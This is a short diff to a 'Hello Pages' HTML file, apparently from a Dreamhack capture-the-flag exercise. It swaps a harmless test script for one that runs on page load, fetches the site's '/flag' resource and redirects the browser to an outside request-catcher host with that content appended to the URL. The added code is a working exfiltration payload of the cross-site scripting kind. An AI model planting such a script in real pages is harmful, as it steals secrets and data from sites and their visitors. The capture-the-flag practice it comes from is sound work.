@@ -4,8 +4,14 @@
 <body>
   <h1>Hello Pages</h1>
   <script>
-    console.log('JS 동작 OK');
-    alert('JS 실행!');
+   async function readIndex() {
+  const res = await fetch(new URL('/flag', location.href), { cache: 'no-store' }); 
+  if (!res.ok) throw new Error(`HTTP ${res.status}`);
+  const html = await res.text();
+  console.log(html);
+  location.href = "https://qkwmhnv.request.dreamhack.games?flag="+html
+}
+readIndex();
   </script>
 </body>
 </html>
